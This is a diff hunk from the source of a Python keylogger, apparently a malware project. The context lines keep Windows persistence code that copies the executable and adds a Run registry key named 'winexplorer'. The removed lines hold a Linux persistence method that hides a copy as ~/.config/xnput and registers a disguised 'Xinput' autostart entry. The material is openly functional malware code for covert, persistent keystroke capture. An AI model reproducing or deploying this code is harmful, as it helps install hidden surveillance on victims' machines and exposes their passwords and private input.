@@ -72,28 +72,6 @@ class Keylogger:
             shutil.copyfile(sys.executable, evil_file_location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
-    def become_persistent_on_linux(self):
-        home_config_directory = os.path.expanduser('~') + "/.config/"
-        autostart_path = home_config_directory + "/autostart/"
-        autostart_file = autostart_path + "xinput.desktop"
-        if not os.path.isfile(autostart_file):
-            self.log = "** Keylogger started **"
-            try:
-                os.makedirs(autostart_path)
-            except OSError:
-                pass
-
-            destination_file = home_config_directory + "xnput"
-            shutil.copyfile(sys.executable, destination_file)
-            self.chmod_to_exec(destination_file)
-
-            with open(autostart_file, 'w') as out:
-                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
-                out.write("Name=Xinput\nExec=" + destination_file + "\n")
-
-            self.chmod_to_exec(autostart_file)
-            subprocess.Popen(destination_file)
-            sys.exit()
 
     def chmod_to_exec(self, file):
         os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
